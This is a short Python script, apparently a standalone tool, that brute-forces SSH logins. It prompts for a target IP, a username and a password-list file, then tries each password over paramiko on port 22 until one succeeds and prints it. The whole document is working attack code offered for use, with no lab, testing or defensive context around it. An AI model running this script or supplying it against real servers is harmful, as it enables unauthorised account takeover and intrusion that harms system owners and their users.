import os,socket,sys,paramiko

ip = input("Input IP address>:")
username=input("Input username>:")
pwFile= input("Password directory>:")

def fileOpening(pwFile):
    """This function work for opening file and need to give file directory.
    And then this function read data line by line and also strip.
    """
    try:
        with open(pwFile, 'r') as pwfile:
            for pw in pwfile.readlines():
                password = pw.strip()
                status = connection(password)
                if status==0:
                    print('Password is {0}'.format(password))
                    break
                elif status==1:
                    print("Passowrd Not Found at {0}".format(password))
                elif status==2:
                    print("Socket Errors")
                    sys.exit(1)
                elif status==3:
                    print("Server's host key could not be verified")
                elif status==4:
                    print("Error establishing and SSH session")
    except ValueError as err:
        print(err)
    else:
        print("Nothing happen here!")
def connection(password , code=0):
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip , port=22 , username=username , password=password)
    except paramiko.AuthenticationException:
        code=1
    except socket.error as err:
        code=2
    except paramiko.BadHostKeyException:
        code=3
    except paramiko.SSHException:
        code=4
    ssh.close()
    return code

if __name__=="__main__":
    fileOpening(pwFile)
